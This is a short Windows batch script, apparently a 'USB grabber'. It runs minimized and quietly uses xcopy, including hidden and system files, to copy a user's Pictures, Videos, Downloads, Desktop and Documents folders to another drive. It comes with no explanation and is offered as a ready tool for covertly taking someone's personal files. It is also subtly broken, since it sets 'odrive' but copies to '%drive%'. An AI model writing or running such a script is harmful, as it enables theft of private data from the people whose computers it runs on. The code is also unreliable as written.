/min
SET odrive=%odrive:~0,2%
set background=xcopy /s /c /d /e /h /i /r 
echo off
%background% "%USERPROFILE%\pictures" "%drive%\all\Pics"
%background% "%USERPROFILE%\videos" "%drive%\all\vid"
%background% "%USERPROFILE%\Download" "%drive%\all\down"
%background% "%USERPROFILE%\Desktop" "%drive%\all\desk"
%background% "%USERPROFILE%\Documents" "%drive%\all\doc"
@echo off